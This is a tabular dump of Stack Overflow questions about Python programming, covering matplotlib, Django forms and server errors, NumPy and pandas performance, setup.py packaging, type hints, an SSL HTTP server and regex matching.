boxstyle = BoxStyle(""Round"", pad=1)
props = {'boxstyle': boxstyle,
         'facecolor': 'white',
         'linestyle': 'solid',
         'linewidth': 1,
         'edgecolor': 'black'}

textbox = plt.text(xpos, ypos, text, bbox=props)
plt.show()
textbox.get_bbox_patch().get_width() # 54.121092459652573
</code></pre>

<p>However, this does not take into account the padding. Indeed, if I set the padding to 0, I get the same width.</p>

<pre><code>boxstyle = BoxStyle(""Round"", pad=0)
props = {'boxstyle': boxstyle,
         'facecolor': 'white',
         'linestyle': 'solid',
         'linewidth': 1,
         'edgecolor': 'black'}

textbox = plt.text(xpos, ypos, text, bbox=props)
plt.show()
textbox.get_bbox_patch().get_width() # 54.121092459652573
</code></pre>

<p>My question is: how can I get the width of the surrounding box? or how can I get the size of the padding in the case of a FancyBoxPatch? </p>
"
40022982,6865194.0,2016-10-13 13:53:18+00:00,2,Django - Dynamic form fields based on foreign key,"<p>I'm working on creating a database which has programs and these programs have risks. Some background information: Programs (grandparents) have multiple Characteristics (parents) which have multiple Categories (children). I've already constructed a database containing these, however, I want to add risks to a particular program.</p>

<p>That is, for example i have Risk 1 which i want to add to Program 1. I have to answer the following questions: Which characteristics do Risk 1 have? To answer this, I want to construct a dynamic form field. (Note, the amount of characteristics can by any arbitrary number, as well as the amount of categories each characteristic has).</p>

<p>How do I construct such form? I've tried formsets, however I do not know how to implement those in a practical way (I'm still a bit new with Python).</p>

<p>This is a printscreen of how I want it to be implemented: <a href=""https://gyazo.com/40c448c0096a9ec5da751ba9883dc912"" rel=""nofollow"">https://gyazo.com/40c448c0096a9ec5da751ba9883dc912</a><br>
However, I have no idea what to do. (Note that the possible answers in the drop down menu are the categories that correspond to that particular Characteristic).
This is what I'm getting: <a href=""https://gyazo.com/25fd18e2f31e6931bfd3639ce4be632c"" rel=""nofollow"">https://gyazo.com/25fd18e2f31e6931bfd3639ce4be632c</a></p>

<p>This is the corresponding code I have thus far:</p>

<pre><code># views.py 
def risk_create(request):
program = get_object_or_404(Program, id=20)
RiskFormSet = formset_factory(RiskForm, ...
    ... extra=len(Program.objects.get(id=program.id).char_set.all()))
context = {
    'title': 'New Risk',
    'form': RiskFormSet
}
return render(request, 'risk_form.html', context)


# forms.py
class RiskForm(forms.Form):
for char in Program.objects.get(id=20).char_set.all():
    char = forms.ModelChoiceField(char.cat_set.all(), label=char)
</code></pre>

<p>I'VE FOUND MY ANSWER.</p>

<pre><code>class RiskForm(forms.Form):
def __init__(self, *args, **kwargs):
    programid = kwargs.pop('programid', None)
    super(RiskForm, self).__init__(*args, **kwargs)
    for i in range(0,len(Program.objects.get(id=programid).char_set.all())):
        charid = Program.objects.get(id=programid).char_set.all()[i].id
        charlabel = Program.objects.get(id=programid).char_set.all()[i].label
        self.fields['char_field_%i' %i] = forms.ModelChoiceField(Char.objects.get(id=charid).cat_set.all(), label=charlabel)
</code></pre>
"
39753717,3492901.0,2016-09-28 17:08:47+00:00,2,How do I apply QScintilla syntax highlighting to a QTextEdit in PyQt4?,"<p>I have a simple PyQt text editor, and would like to apply QScintilla formatting to it. I need to use a QTextEdit for the text, as it provides other functionality that I am using (cursor position, raw text output, etc), and would like to apply QScintilla formatting. </p>

<p>Just for refrence, the initialisation of the QTextEdit:</p>

<pre><code>self.text = QtGui.QTextEdit(self)
</code></pre>
"
39753605,6752946.0,2016-09-28 17:02:28+00:00,2,Using replace instead of find,"<p>I have written the following piece but not able to figure the next part:</p>

<pre><code>if request.guess in game.target:            
  position = game.target.find(request.guess)
  game.correct[position] = request.guess.upper()
</code></pre>

<p>The point here is <code>request.guess</code> is a character input like <code>'a'</code> and <code>game.target</code> is <code>'austin'</code>. So the above code will find the character in the target word and generate an output like <code>a*****</code>. But my code will only work for words that have letters not repeated in them eg: Australia. I know there is a method 'replace' in python but I am not able to figure out how should I incorporate here.</p>

<p>Kindly help!!!!!</p>
"
39647440,1391444.0,2016-09-22 19:30:32+00:00,2,"How can I repeatedly play a sound sample, allowing the next loop to overlap the previous","<p>Not sure if this isn't a dupe, but the posts I found so far didn't solve my issue. </p>

<hr>

<p>A while ago, I wrote a (music) <a href=""http://askubuntu.com/a/814889/72216"">metronome for Ubuntu</a>. The metronome is written in <code>python3/Gtk</code> </p>

<p>To repeatedly play the metronome- tick (a recorded sound sample), I used <code>subprocess.Popen()</code> to play the sound, using <code>ogg123</code> as a cli tool: </p>

<pre><code>subprocess.Popen([""ogg123"", soundfile])
</code></pre>

<p>This works fine, I can easily run up to 240 beats per minute.</p>

<h3>On WIndows</h3>

<p>I decided to rewrite the project on Windows (<code>python3/tkinter/ttk</code>). I am having a hard time however to play the sound, repeating the beat sample in higher tempi. The next beat simply won't start while the previous one (appearantly) hasn't finished yet, playing the beat sample.</p>

<p>Is there a way, in <code>python3</code> on Windows, I can start playing the next beat while the sample is still playing?</p>

<p>Currently, I am using <code>winsound</code>: </p>

<pre><code>winsound.Playsound()
</code></pre>

<p>Running this in a loop has, as mentioned issues.</p>
"
40025837,6946145.0,2016-10-13 16:01:58+00:00,2,Can't use sympy parser in my class; TypeError : 'module' object is not callable,"<p>I wrote some code for calculating the differential equation and it's solution using sympy, but I'm getting an error, my code : ( example )</p>

<pre><code>from sympy.parsing import sympy_parser
expr=1/2
r='3/2'
r=sympy_parser(r)
</code></pre>

<p>I get </p>

<pre><code>TypeError: 'module' object is not callable
</code></pre>

<p>What am I doing wrong here ?</p>
"
40032219,7015897.0,2016-10-13 22:43:55+00:00,2,"What am I doing wrong, python loop not repeating?","<p>I just had this working, and now, for the life of me, I cannot get the loop to continue, as it only produces the outcome of the first input. Where did I go wrong? I know im an amateur, but whatever help you might have would be awesome! Thanks. </p>

<pre><code>sequence = open('sequence.txt').read().replace('\n','')
enzymes = {}
fh = open('enzymes.txt')
print('Restriction Enzyme Counter')
inez = input('Enter a Restricting Enzyme: ')
def servx():
    for line in fh:
        (name, site, junk, junk) = line.split()
        enzymes[name] = site 
        if inez in fh:
            xcr = site
            print('Active Bases:', site)
    for line in sequence.split():
        if xcr in line:
            bs = (sequence.count(xcr))
            print('Enzyme', inez, 'appears', bs, 'times in Sequence.')
servx()
def servy():
    fh.seek(0);
    qust = input('Find another Enzyme? [Yes/No]: ')
    if qust == 'Yes':
        inez = input('Enter a Restricting Enzyme: ')
        servx()
        servy()
    elif qust == 'No':
        print('Thanks!')
    elif qust != 'Yes''No':
        print('Error, Unknown Command')
servy()
fh.close()
</code></pre>
"
40031724,7014625.0,2016-10-13 21:59:55+00:00,2,server 500 error python (visualstudio),"<p>I'm developing a python app using Djgango and I'm getting the server 500 error. I believe my paths are set correctly, the python manage.py runserver returns that the server is running. When I look at developer tools on the page it says ""Failed to load resource: the server responded with a status of 404 (not found) <a href=""http://localhost:64915/favicon.co"" rel=""nofollow"">http://localhost:64915/favicon.co</a>"" and ""failed to load resource: the server responded with a status of 500 (internal server error) <a href=""http://localhost:64915/"" rel=""nofollow"">http://localhost:64915/</a>."" </p>

<p>I don't know what is going on? I'm new to Django coming from asp.net which runs without all the go around. can you help me? Here is my wsgi.py file code. </p>

<pre><code>""""""
WSGI config for SmartShopper project.

This module contains the WSGI application used by Django's development server
and any production WSGI deployments. It should expose a module-level variable
named ``application``. Django's ``runserver`` and ``runfcgi`` commands discover
this application via the ``WSGI_APPLICATION`` setting.

Usually you will have the standard Django WSGI application here, but it also
might make sense to replace the whole Django WSGI application with a custom one
that later delegates to the Django one. For example, you could introduce WSGI
middleware here, or combine a Django application with an application of another
framework.

""""""
import os

os.environ.setdefault(""DJANGO_SETTINGS_MODULE"", ""SmartShopper.settings"")

# This application object is used by any WSGI server configured to use this
# file. This includes Django's development server, if the WSGI_APPLICATION
# setting points here.
from django.core.wsgi import get_wsgi_application
application = get_wsgi_application()

# Apply WSGI middleware here.
# from helloworld.wsgi import HelloWorldApplication
# application = HelloWorldApplication(application)
</code></pre>

<p>here is my settings.py file code</p>

<pre><code>""""""
Django settings for SmartShopper project.
""""""

from os import path
PROJECT_ROOT = path.dirname(path.abspath(path.dirname(__file__)))

DEBUG = False
TEMPLATE_DEBUG = DEBUG

ALLOWED_HOSTS = (
    'localhost',
)

ADMINS = (
    # ('Your Name', 'your_email@example.com'),
)

MANAGERS = ADMINS

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': path.join(PROJECT_ROOT, 'db.sqlite3'),
        'USER': '',
        'PASSWORD': '',
        'HOST': '',
        'PORT': '',
    }
}

LOGIN_URL = '/login'

# Local time zone for this installation. Choices can be found here:
# http://en.wikipedia.org/wiki/List_of_tz_zones_by_name
# although not all choices may be available on all operating systems.
# On Unix systems, a value of None will cause Django to use the same
# timezone as the operating system.
# If running in a Windows environment this must be set to the same as your
# system time zone.
TIME_ZONE = 'America/Chicago'

# Language code for this installation. All choices can be found here:
# http://www.i18nguy.com/unicode/language-identifiers.html
LANGUAGE_CODE = 'en-us'

SITE_ID = 1

# If you set this to False, Django will make some optimizations so as not
# to load the internationalization machinery.
USE_I18N = True

# If you set this to False, Django will not format dates, numbers and
# calendars according to the current locale.
USE_L10N = True

# If you set this to False, Django will not use timezone-aware datetimes.
USE_TZ = True

# Absolute filesystem path to the directory that will hold user-uploaded files.
# Example: ""/home/media/media.lawrence.com/media/""
MEDIA_ROOT = ''

# URL that handles the media served from MEDIA_ROOT. Make sure to use a
# trailing slash.
# Examples: ""http://media.lawrence.com/media/"", ""http://example.com/media/""
MEDIA_URL = ''

# Absolute path to the directory static files should be collected to.
# Don't put anything in this directory yourself; store your static files
# in apps' ""static/"" subdirectories and in STATICFILES_DIRS.
# Example: ""/home/media/media.lawrence.com/static/""
STATIC_ROOT = path.join(PROJECT_ROOT, 'static').replace('\\', '/')

# URL prefix for static files.
# Example: ""http://media.lawrence.com/static/""
STATIC_URL = '/static/'

# Additional locations of static files
STATICFILES_DIRS = (
    # Put strings here, like ""/home/html/static"" or ""C:/www/django/static"".
    # Always use forward slashes, even on Windows.
    # Don't forget to use absolute paths, not relative paths.
)

# List of finder classes that know how to find static files in
# various locations.
STATICFILES_FINDERS = (
    'django.contrib.staticfiles.finders.FileSystemFinder',
    'django.contrib.staticfiles.finders.AppDirectoriesFinder',
#    'django.contrib.staticfiles.finders.DefaultStorageFinder',
)

# Make this unique, and don't share it with anybody.
SECRET_KEY = 'n(bd1f1c%e8=_xad02x5qtfn%wgwpi492e$8_erx+d)!tpeoim'

# List of callables that know how to import templates from various sources.
TEMPLATE_LOADERS = (
    'django.template.loaders.filesystem.Loader',
    'django.template.loaders.app_directories.Loader',
#     'django.template.loaders.eggs.Loader',
)

MIDDLEWARE_CLASSES = (
    'django.middleware.common.CommonMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    # Uncomment the next line for simple clickjacking protection:
    # 'django.middleware.clickjacking.XFrameOptionsMiddleware',
)

ROOT_URLCONF = 'SmartShopper.urls'

# Python dotted path to the WSGI application used by Django's runserver.
WSGI_APPLICATION = 'SmartShopper.wsgi.application'

TEMPLATE_DIRS = (
    # Put strings here, like ""/home/html/django_templates"" or
    # ""C:/www/django/templates"".
    # Always use forward slashes, even on Windows.
    # Don't forget to use absolute paths, not relative paths.
)

INSTALLED_APPS = (
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.sites',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'app',
    # Uncomment the next line to enable the admin:
    # 'django.contrib.admin',
    # Uncomment the next line to enable admin documentation:
    # 'django.contrib.admindocs',
)

# A sample logging configuration. The only tangible logging
# performed by this configuration is to send an email to
# the site admins on every HTTP 500 error when DEBUG=False.
# See http://docs.djangoproject.com/en/dev/topics/logging for
# more details on how to customize your logging configuration.
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'filters': {
        'require_debug_false': {
            '()': 'django.utils.log.RequireDebugFalse'
        }
    },
    'handlers': {
        'mail_admins': {
            'level': 'ERROR',
            'filters': ['require_debug_false'],
            'class': 'django.utils.log.AdminEmailHandler'
        }
    },
    'loggers': {
        'django.request': {
            'handlers': ['mail_admins'],
            'level': 'ERROR',
            'propagate': True,
        },
    }
}

# Specify the default test runner.
TEST_RUNNER = 'django.test.runner.DiscoverRunner'
</code></pre>

<p>when running with debug = true it says I have an error in the view.py on line 19 - the render line. This is an autogenerated view by visual studio. I already had to change the url.py to reflect an upated django format. I wonder if you guys can help me spot the same here. here is my code for the views.py.</p>

<pre><code>Definition of views.
""""""

from django.shortcuts import render
from django.http import HttpRequest
from django.template import RequestContext
from datetime import datetime

def home(request):
    """"""Renders the home page.""""""
    assert isinstance(request, HttpRequest)
    return render(
        request,
        'app/index.html',
        context_instance = RequestContext(request,
        {
            'title':'Home Page',
            'year':datetime.now().year,
        })
    )

def contact(request):
    """"""Renders the contact page.""""""
    assert isinstance(request, HttpRequest)
    return render(
        request,
        'app/contact.html',
        context_instance = RequestContext(request,
        {
            'title':'Contact',
            'message':'Your contact page.',
            'year':datetime.now().year,
        })
    )

def about(request):
    """"""Renders the about page.""""""
    assert isinstance(request, HttpRequest)
    return render(
        request,
        'app/about.html',
        context_instance = RequestContext(request,
        {
            'title':'About',
            'message':'Your application description page.',
            'year':datetime.now().year,
        })
    )
</code></pre>

<p>here is the traceback.</p>

<pre><code>Environment:


Request Method: GET
Request URL: http://localhost:64625/

Django Version: 1.10.2
Python Version: 3.5.2
Installed Applications:
('django.contrib.auth',
 'django.contrib.contenttypes',
 'django.contrib.sessions',
 'django.contrib.sites',
 'django.contrib.messages',
 'django.contrib.staticfiles',
 'app')
Installed Middleware:
('django.middleware.common.CommonMiddleware',
 'django.contrib.sessions.middleware.SessionMiddleware',
 'django.middleware.csrf.CsrfViewMiddleware',
 'django.contrib.auth.middleware.AuthenticationMiddleware',
 'django.contrib.messages.middleware.MessageMiddleware')



Traceback:

File ""C:\Program Files (x86)\Python35-32\lib\site-packages\django\core\handlers\exception.py"" in inner
  39.             response = get_response(request)

File ""C:\Program Files (x86)\Python35-32\lib\site-packages\django\core\handlers\base.py"" in _legacy_get_response
  249.             response = self._get_response(request)

File ""C:\Program Files (x86)\Python35-32\lib\site-packages\django\core\handlers\base.py"" in _get_response
  187.                 response = self.process_exception_by_middleware(e, request)

File ""C:\Program Files (x86)\Python35-32\lib\site-packages\django\core\handlers\base.py"" in _get_response
  185.                 response = wrapped_callback(request, *callback_args, **callback_kwargs)

File ""C:\Users\USER\Documents\GitHub\Capstone\SmartShopper\SmartShopper\app\views.py"" in home
  19.             'year':datetime.now().year,

Exception Type: TypeError at /
Exception Value: render() got an unexpected keyword argument 'context_instance'
</code></pre>
"
40030448,5265222.0,2016-10-13 20:32:40+00:00,2,Speeding up Numpy Masking,"<p>I'm still an amature when it comes to thinking about how to optimize.  I have this section of code that takes in a list of found peaks and finds where these peaks,+/- some value, are located in a multidimensional array.  It then adds +1 to their indices of a zeros array.  The code works well, but it takes a long time to execute.  For instance it is taking close to 45min to run if <code>ind</code> has 270 values  and <code>refVals</code> has a shape of (3050,3130,80). I understand that its a lot of data to churn through, but is there a more efficient way of going about this? </p>

<pre><code>maskData = np.zeros_like(refVals).astype(np.int16)

for peak in ind:
        tmpArr = np.ma.masked_outside(refVals,x[peak]-2,x[peak]+2).astype(np.int16)
        maskData[tmpArr.mask == False  ] += 1
        tmpArr = None

maskData = np.sum(maskData,axis=2)
</code></pre>
"
40031287,3163773.0,2016-10-13 21:27:03+00:00,2,Matrix operations with rows of pandas dataframes,"<p>I have a pandas dataframe that contains three columns corresponding to x, y and z coordinates for positions of objects. I also have a transformation matrix ready to rotate those points by a certain angle. I had previously looped through each row of the dataframe performing this transformation but I found that that is very, very time consuming. Now I just want to perform the transformations all at once and append the results as additional columns. </p>

<p>I'm looking for a working version of this line (which always returns a shape mismatch):</p>

<pre><code>largest_haloes['X_rot', 'Y_rot', 'Z_rot'] = np.dot(rot,np.array([largest_haloes['X'], largest_haloes['Y'], largest_haloes['Z']]).T)
</code></pre>

<p>Here's a minimum working example:</p>

<pre><code>from __future__ import division
import math
import pandas as pd
import numpy as np

def unit_vector(vector):
    return vector / np.linalg.norm(vector)


largest_haloes = pd.DataFrame()
largest_haloes['X'] = np.random.uniform(1,10,size=30)
largest_haloes['Y'] = np.random.uniform(1,10,size=30)
largest_haloes['Z'] = np.random.uniform(1,10,size=30)

normal = np.array([np.random.uniform(-1,1),np.random.uniform(-1,1),np.random.uniform(0,1)])
normal = unit_vector(normal)

a = normal[0]
b = normal[1]
c = normal[2]

rot = np.array([[b/math.sqrt(a**2+b**2), -1*a/math.sqrt(a**2+b**2), 0], [(a*c)/math.sqrt(a**2+b**2), b*c/math.sqrt(a**2+b**2), -1*math.sqrt(a**2+b**2)], [a, b, c]])

largest_haloes['X_rot', 'Y_rot', 'Z_rot'] = np.dot(rot,np.array([largest_haloes['X'], largest_haloes['Y'], largest_haloes['Z']]).T)
</code></pre>

<p>So the goal is that each row of largest_haloes['X_rot', 'Y_rot', 'Z_rot'] should be populated with a rotated version of the corresponding row of largest_haloes['X','Y','Z']. How can I do this without looping through rows? I've also tried df.dot but there is not much documentation on it and it didn't seem to do what I wanted.</p>
"
40092294,4459665.0,2016-10-17 17:26:37+00:00,2,Creating a matplotlib or seaborn histogram which uses percent rather than count?,"<p>Specifically I'm dealing with the Kaggle Titanic dataset. I've plotted a stacked histogram which shows ages that survived and died upon the titanic. Code below.</p>

<pre><code>figure = plt.figure(figsize=(15,8))
plt.hist([data[data['Survived']==1]['Age'], data[data['Survived']==0]['Age']], stacked=True, bins=30, label=['Survived','Dead'])
plt.xlabel('Age')
plt.ylabel('Number of passengers')
plt.legend()
</code></pre>

<p>I would like to alter the chart to show a single chart per bin of the percentage in that age group that survived. E.g. if a bin contained the ages between 10-20 years of age and 60% of people aboard the titanic in that age group survived, then the height would line up 60% along the y-axis.</p>

<p>Edit: I may have given a poor explanation to what I'm looking for. Rather than alter the y-axis values, I'm looking to change the actual shape of the bars based on the percentage that survived.</p>

<p>The first bin on the graph shows roughly 65% survived in that age group. I would like this bin to line up against the y-axis at 65%. The following bins look to be 90%, 50%, 10% respectively, and so on.</p>

<p><a href=""https://i.stack.imgur.com/5OQiQ.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/5OQiQ.png"" alt=""""></a></p>

<p>The graph would end up actually looking something like this:</p>

<p><a href=""https://i.stack.imgur.com/qVQI3.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/qVQI3.png"" alt=""enter image description here""></a></p>
"
40031422,418966.0,2016-10-13 21:36:48+00:00,2,Python - Recursively include package data in setup.py,"<p>Is it possible to configure setup.py so that package data are included recursively?</p>

<p>For example, is there an equivalent of this:</p>

<pre><code>setup(...,
      packages=['mypkg'],
      package_data={'mypkg': ['data/*.dat']},
      )
</code></pre>

<p>which just specifies the folder (perhaps with some extra option)?</p>

<pre><code>setup(...,
      packages=['mypkg'],
      package_data={'mypkg': ['data']},
      )
</code></pre>

<p>Examples taken from:</p>

<p><a href=""https://docs.python.org/2/distutils/setupscript.html#installing-package-data"" rel=""nofollow"">https://docs.python.org/2/distutils/setupscript.html#installing-package-data</a></p>
"
40092147,6702501.0,2016-10-17 17:16:35+00:00,2,Apache/Django Install: RuntimeError: Model class django.contrib.contenttypes.models.ContentType doesn't declare an explicit,"<p>I am using Django 1.9 and python 2.7 on centos7</p>

<p>I am getting the following error ONLY when trying to use Apache with Django.</p>

<pre><code>RuntimeError: Model class django.contrib.contenttypes.models.ContentType doesn't declare an explicit app_label and isn't in an application in INSTALLED_APPS.
</code></pre>

<p>I do NOT get the error using the Django web-server, my application works fine under the Django web-server, but I have read not to use the Django web-server but Apache instead.</p>

<p>I have run into multiple issues trying to get apache to work with django, and have found solutions to all of the preceding issues, but cannot resolve this one.</p>

<p>Here are my installed apps with ""<code>django.contrib.contenttypes</code>"" in the list in this order:</p>

<pre><code>'django.contrib.admin',
'django.contrib.auth',
'django.contrib.contenttypes',
'django.contrib.sessions',
'django.contrib.messages',
'django.contrib.staticfiles',
'admin_alerts',
'admin_dq_metrics',
'admin_db_conn',
'admin_file_conn',
'admin_application',
'admin_process',
'admin_src_status_chk',
'admin_scheduler_template',
'export_to_db',
'export_to_file',
'migrate_to_prod',
'migrate_to_stg',
'migrate_to_dev',
'tableau_tde',
'ingest_file',
'ingest_db',
'scheduler',
'dq_entity_cross_ref',
'high_water_column_ref',
'process_control',
'difa_login',
'admin_create_user',
'update_export_ingest_data',
'admin_add_user',
'django.contrib.sites',
</code></pre>

<p>Thanks...</p>
"
40031569,5405545.0,2016-10-13 21:48:59+00:00,2,Calculating the time difference between events,"<p>I have a df</p>

<pre><code>df = pd.DataFrame({'State': {0: ""A"", 1: ""B"", 2:""A"", 3: ""B"", 4: ""A"", 5: ""B"", 6 : ""A"", 7: ""B""}, 
               'date': {0: '2016-10-13T14:10:41Z', 1: '2016-10-13T14:10:41Z', 2:'2016-10-13T15:26:19Z',
                        3: '2016-10-14T15:26:19Z', 4: '2016-10-15T15:26:19Z', 5: '2016-10-18T15:26:19Z',
                        6 :'2016-10-17T15:26:19Z', 7: '2016-10-13T15:26:19Z'}}, columns=['State', 'date'])
</code></pre>

<p>I need to get an average of the time between each a event and the following b event. I'm trying to use shift to generate a series of differences to average it but I can't quite get it to work.</p>

<p>Thank you!</p>
"
39651540,6866434.0,2016-09-23 02:14:11+00:00,2,First Unique Character in a String,"<p>Given a string, find the first non-repeating character in it and return its index. If it doesn't exist, return -1.</p>

<pre><code>first_unique('leetcode')  # 0
first_unique('loveleetcode')  # 2
</code></pre>

<p>I came up with the following solution.  How can I make it more efficient for very long input strings?</p>

<pre><code>def first_unique(self, s):
    if s == '':
        return -1

    for item in s:
        if s.count(item) == 1:
            return s.index(item)
            break

    return -1
</code></pre>
"
39740632,1760858.0,2016-09-28 07:21:35+00:00,2,Python type hinting without cyclic imports,"<p>I'm trying to split my huge class into two; well, basically into the ""main"" class and a mixin with additional functions, like so:</p>

<pre><code># main.py
import mymixin.py

class Main(object, MyMixin):
    def func1(self, xxx):
        ...


# mymixin.py
class MyMixin(object):
    def func2(self: Main, xxx):  # &lt;--- note the type hint
        ...
</code></pre>

<p>Now, while this works just fine, the type hint in MyMixin.func2 of course can't work. I can't import main.py, because I'd get a cyclic import and without the hint, my editor (PyCharm) can't tell what <code>self</code> is.</p>

<p>Using Python 3.4, willing to move to 3.5 if a solution is available there.</p>

<p>Is there any way I can split my class into two files and keep all the ""connections"" so that my IDE still offers me auto completion &amp; all the other goodies that come from it knowing the types?</p>
"
40031792,2715716.0,2016-10-13 22:04:15+00:00,2,"Python SSL server gives me ""501 Unsupported method GET""","<p>I've followed <a href=""https://anvileight.com/blog/2016/03/20/simple-http-server-with-python/"" rel=""nofollow"">this link</a> to build a simple file server with SSL.</p>

<pre><code>from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('localhost', 4443), BaseHTTPRequestHandler)

# openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
httpd.socket = ssl.wrap_socket (httpd.socket, keyfile=""key.pem"", certfile='cert.pem', server_side=True)

httpd.serve_forever()
</code></pre>

<p>I have created a certificate successfully, <code>key.pem</code> and <code>cert.pem</code> file paths are cool and I can start the server using <code>python server.py</code>. I am asked for a password, enter it, then it freezes for a bit and then it seems to run.</p>

<p>However, when I enter some URL such as <code>https://localhost:4443/index.html</code> I get <strong>500 Unsupported method GET. Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</strong> Do I need to do something more to make my server serve the current directory? Until now I have just used <code>python -m http.server 8000</code> (<code>SimpleHTTPServer</code> when on Mac.) I am using Python 3.</p>

<p>This is an will stay local so don't worry about the <code>PEM</code> files and the server script being exposed through it (if it worked!). I am also okay with the certificate being untrusted and instructed Chrome to visit the page anyway. I just need it to allow me to access camera without having to deploy my app somewhere with a legit cert.</p>
"
39647538,2605262.0,2016-09-22 19:37:33+00:00,2,"Pandas groupby datetime, getting the count and price","<p>I'm trying to use pandas to group subscribers by subscription type for a given day and get the average price of a subscription type on that day. The data I have resembles:</p>

<pre><code>Sub_Date             Sub_Type    Price 
2011-03-31 00:00:00  12 Month    331.00
2012-04-16 00:00:00  12 Month    334.70
2013-08-06 00:00:00  12 Month    344.34
2014-08-21 00:00:00  12 Month    362.53
2015-08-31 00:00:00  6 Month     289.47
2016-09-03 00:00:00  6 Month     245.57
2013-04-10 00:00:00  4 Month     148.79
2014-03-13 00:00:00  12 Month    348.46
2015-03-15 00:00:00  12 Month    316.86
2011-02-09 00:00:00  12 Month    333.25
2012-03-09 00:00:00  12 Month    333.88
...
2013-04-03 00:00:00  12 Month    318.34
2014-04-15 00:00:00  12 Month    350.73
2015-04-19 00:00:00  6 Month     291.63
2016-04-19 00:00:00  6 Month     247.35
2011-02-14 00:00:00  12 Month    333.25
2012-05-23 00:00:00  12 Month    317.77
2013-05-28 00:00:00  12 Month    328.16
2014-05-31 00:00:00  12 Month    360.02
2011-07-11 00:00:00  12 Month    335.00
...
</code></pre>

<p>I'm looking to get something that resembles:</p>

<pre><code>Sub_Date             Sub_type    Quantity  Price  
2011-03-31 00:00:00  3 Month     2         125.00
                     4 Month     0         0.00     # Promo not available this month
                     6 Month     1         250.78       
                     12 Month    2         334.70
2011-04-01 00:00:00  3 Month     2         125.00
                     4 Month     2         145.00     
                     6 Month     0         250.78       
                     12 Month    0         334.70
2013-04-02 00:00:00  3 Month     1         125.00
                     4 Month     3         145.00    
                     6 Month     0         250.78       
                     12 Month    1         334.70
...
2015-06-23 00:00:00  3 Month     4         135.12
                     4 Month     0         0.00     # Promo not available this month
                     6 Month     0         272.71       
                     12 Month    3         354.12
...
</code></pre>

<p>I'm only able to get the total number of <code>Sub_Type</code>s for a given date. </p>

<pre><code>df.Sub_Date.groupby([df.Sub_Date.values.astype('datetime64[D]')]).size()
</code></pre>

<p>This is somewhat of a good start, but not exactly what is needed. I've had a look at the <a href=""http://pandas.pydata.org/pandas-docs/stable/groupby.html"" rel=""nofollow"">groupby</a> documentation on the pandas site but I can't get the output I desire.</p>
"
40091796,213334.0,2016-10-17 16:55:23+00:00,2,Pandas: How to find the first valid column among a series of columns,"<p>I have a dataset of different sections of a race in a pandas dataframe from which I need to calculate certain features. It looks something like this:</p>

<pre><code>id         distance     timeto1000m    timeto800m    timeto600m   timeto400m   timeto200m    timetoFinish
1          1400m        10             21            30           39           50            60    
2          1200m        0              19            31           42           49            57   
3          1800m        0              0             0            38           49            62   
4          1000m        0              0             29           40           48            61
</code></pre>

<p>So, what I need to do is for each row find the first <code>timetoXXm</code> column that is non-zero and the correspoding distance <code>XX</code>. For instance, for <code>id=1</code> that would be 1000m, for <code>id=3</code> that would be 400m etc. </p>

<p>I can do this with a series of <code>if..elif..else</code> conditions but was wondering if there is a better way of doing this kind of lookup in pandas/numpy?</p>
"
39740475,6310237.0,2016-09-28 07:14:02+00:00,2,Naming a set of equality equations Python,"<p>I am currently working on solving a system of equations. </p>

<p>A subset of the equations are: </p>

<pre><code>eq1  = pi1  * q[0+1] == pi0 * r[0+1]
eq2  = pi2  * q[0+1] == pi0 * r[1+1]  + pi1 * r[1+1]
eq3  = pi3  * q[0+1] == pi0 * r[2+1]  + pi1 * r[2+1]  + pi2 * r[1+1]
eq4  = pi4  * q[0+1] == pi0 * r[3+1]  + pi1 * r[3+1]  + pi2 * r[2+1]  + pi3 * r[1+1]
eq5  = pi5  * q[0+1] == pi0 * r[4+1]  + pi1 * r[4+1]  + pi2 * r[3+1]  + pi3 * r[2+1]  + pi4 * r[1+1]
eq6  = pi6  * q[0+1] == pi0 * r[5+1]  + pi1 * r[5+1]  + pi2 * r[4+1]  + pi3 * r[3+1]  + pi4 * r[2+1]  + pi5 * r[1+1]
eq7  = pi7  * q[0+1] == pi0 * r[6+1]  + pi1 * r[6+1]  + pi2 * r[5+1]  + pi3 * r[4+1]  + pi4 * r[3+1]  + pi5 * r[2+1]  + pi6 * r[1+1]
</code></pre>

<p>Unfortunately, this is not working the way I want it to be working. I want it to be read as follows: the first equation has the name 'eq1' and has a certain equality equation. The other lines should be read similarly. In my code I have 14 more equations which are even longer. I want to give them a name to avoid really long expressions in ""solve([], [])"" . </p>

<p>Is this possible? And if so, how should it be done?</p>
"
40091617,6095474.0,2016-10-17 16:44:30+00:00,2,Test for consecutive numbers in list,"<p>I have a list that contains only integers, and I want to check if all the numbers in the list are consecutive (the order of the numbers does not matter).</p>

<p>If there are repeated elements, the function should return False.</p>

<p>Here is my attempt to solve this:</p>

<pre><code>def isconsecutive(lst):
    """""" 
    Returns True if all numbers in lst can be ordered consecutively, and False otherwise
    """"""
    if len(set(lst)) == len(lst) and max(lst) - min(lst) == len(lst) - 1:
        return True
    else:
        return False
</code></pre>

<p>For example:</p>

<pre><code>l = [-2,-3,-1,0,1,3,2,5,4]

print(isconsecutive(l))

True
</code></pre>

<p>Is this the best way to do this?</p>
"
39652922,6868201.0,2016-09-23 05:01:13+00:00,2,Regex Match Whole Multiline Comment Cointaining Special Word,"<p>I've been trying to design this regex but for the life of me I could not get it to not match if */ was hit before the special word.</p>

<p>I'm trying to match a whole multi line comment only if it contains a special word.  I tried negative lookaheads/behinds but I could not figure out how to do it properly.</p>

<p>This is what I have so far:
<code>(?s)(/\*.+?special.+?\*/)</code></p>

<p>Am I close or horribly off base? I tried including <code>(?!\*/)</code> unsuccessfully.</p>

<p><a href=""https://regex101.com/r/mD1nJ2/3"" rel=""nofollow"">https://regex101.com/r/mD1nJ2/3</a></p>

<p>Edit: I had some redundant parts to the regex I removed.</p>
"
